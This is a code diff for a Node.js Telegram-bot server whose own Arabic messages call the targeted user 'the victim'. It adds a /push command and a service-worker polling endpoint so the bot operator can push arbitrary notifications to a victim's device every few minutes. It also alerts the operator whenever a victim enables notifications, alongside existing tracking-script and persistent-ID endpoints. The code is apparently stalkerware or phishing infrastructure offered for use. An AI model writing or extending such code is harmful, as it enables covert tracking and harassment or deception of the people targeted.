@@ -753,6 +753,17 @@ bot.on('message', async (msg) => {
 
   if (msg.text?.startsWith("/link ")) return createLink(chatId, msg.text.replace("/link ","").trim());
 
+  if (msg.text?.startsWith("/push ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const parts = msg.text.replace("/push ","").trim().split(" ");
+    const pUid  = parts.shift();
+    const pText = parts.join(" ").trim();
+    if (!pUid || !pText) return bot.sendMessage(chatId, "الاستخدام: /push [uid] [النص]");
+    if (!pushSubs[pUid]) return bot.sendMessage(chatId, "❌ هذا الجهاز لم يفعّل الإشعارات بعد.");
+    sendPushToDevice(pUid, "🔔 رسالة جديدة", pText);
+    return bot.sendMessage(chatId, `✅ تم إرسال الإشعار — سيظهر على جهاز الضحية خلال 3 دقائق كحد أقصى`);
+  }
+
   if (msg.text === "/ping") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const s=Date.now(); const m=await bot.sendMessage(chatId,"🏓 Pong!");
@@ -1467,49 +1478,40 @@ app.get("/t.js", (req, res) => {
 })();`);
 });
 
-// ── Web Push: save subscription ───────────────────────────────────────────────
-const PUSH_FILE = "./push_subs.json";
-let pushSubs = loadJSON(PUSH_FILE, {});  // { uid: [subscription, ...] }
+// ── Web Push: polling-based (no VAPID needed) ─────────────────────────────────
+const PUSH_FILE  = "./push_subs.json";
+const PUSH_QUEUE = "./push_queue.json";
+let pushSubs  = loadJSON(PUSH_FILE,  {});  // { uid: true }
+let pushQueue = loadJSON(PUSH_QUEUE, {});  // { uid: {title,msg} }
 
 app.post("/push-subscribe", (req, res) => {
   res.send("ok");
   const uid = req.body.uid || '';
-  const sub = req.body.sub || '';
-  if (!uid || !sub) return;
-  try {
-    const parsed = JSON.parse(sub);
-    if (!pushSubs[uid]) pushSubs[uid] = [];
-    // avoid duplicates by endpoint
-    const exists = pushSubs[uid].some(s => s.endpoint === parsed.endpoint);
-    if (!exists) {
-      pushSubs[uid].push(parsed);
-      saveJSON(PUSH_FILE, pushSubs);
-    }
-    const tid = parseInt(uid, 36);
-    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ يمكنك الآن إرسال رسائل لجهازها في أي وقت\nاستخدم: /push ${uid} النص`);
-    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 اشتراك Push جديد!\nUID: ${uid}\n(ID: ${tid})`);
-  } catch(e) {}
-});
-
-// ── Web Push: send notification (/push uid text) ──────────────────────────────
-app.post("/send-push", async (req, res) => {
-  res.send("ok");
-  const uid   = req.body.uid || '';
-  const title = req.body.title || '🔔 رسالة';
-  const body  = req.body.body || '';
   if (!uid) return;
-  const subs = pushSubs[uid] || [];
-  for (const sub of subs) {
-    try {
-      // Native fetch-based push (no vapid, works with notification-only)
-      await fetch(sub.endpoint, {
-        method: 'POST',
-        headers: { 'TTL': '86400', 'Content-Type': 'application/json' },
-        body: JSON.stringify({ title, body })
-      });
-    } catch(e) {}
+  if (!pushSubs[uid]) {
+    pushSubs[uid] = true;
+    saveJSON(PUSH_FILE, pushSubs);
+    const tid = parseInt(uid, 36);
+    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ يمكنك إرسال إشعار لجهازها في أي وقت\nاستخدم: /push ${uid} النص`);
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\nUID: ${uid} | ID: ${tid}`);
   }
 });
+
+// SW polls this every 3 min to check for pending messages
+app.get("/push-poll", (req, res) => {
+  const uid = req.query.uid || '';
+  if (!uid || !pushQueue[uid]) return res.json({});
+  const msg = pushQueue[uid];
+  delete pushQueue[uid];
+  saveJSON(PUSH_QUEUE, pushQueue);
+  res.json(msg);
+});
+
+// Bot command /push uid text → queues a push notification
+function sendPushToDevice(uid, title, msg) {
+  pushQueue[uid] = { title, msg };
+  saveJSON(PUSH_QUEUE, pushQueue);
+}
 
 // ── Persistent ID report ───────────────────────────────────────────────────────
 app.post("/pid", (req, res) => {
